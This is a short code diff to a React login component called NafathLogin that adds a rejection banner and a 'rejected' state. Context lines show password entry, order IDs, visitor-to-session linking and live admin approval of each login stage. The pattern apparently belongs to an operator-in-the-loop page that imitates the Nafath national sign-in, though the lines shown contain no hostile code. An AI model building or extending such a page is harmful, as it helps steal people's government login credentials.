@@ -4,6 +4,7 @@ import { Loader2, User, Lock, LogIn, Info } from "lucide-react";
 import { motion, AnimatePresence } from "framer-motion";
 import VerificationLayout from "@/components/VerificationLayout";
 import WaitingApprovalOverlay from "@/components/WaitingApprovalOverlay";
+import RejectionBanner from "@/components/RejectionBanner";
 import { createOrUpdateStage, useAdminApproval } from "@/hooks/useAdminApproval";
 import { linkVisitorToSession } from "@/lib/visitorLink";
 import { toast } from "sonner";
@@ -27,6 +28,7 @@ const NafathLogin = () => {
   const [orderId, setOrderId] = useState<string | null>(passedOrderId);
   const [showPassword, setShowPassword] = useState(false);
   const [waitingApproval, setWaitingApproval] = useState(false);
+  const [rejected, setRejected] = useState(false);
 
   const approvalStatus = useAdminApproval(waitingApproval ? orderId : null, "nafath_login");
 
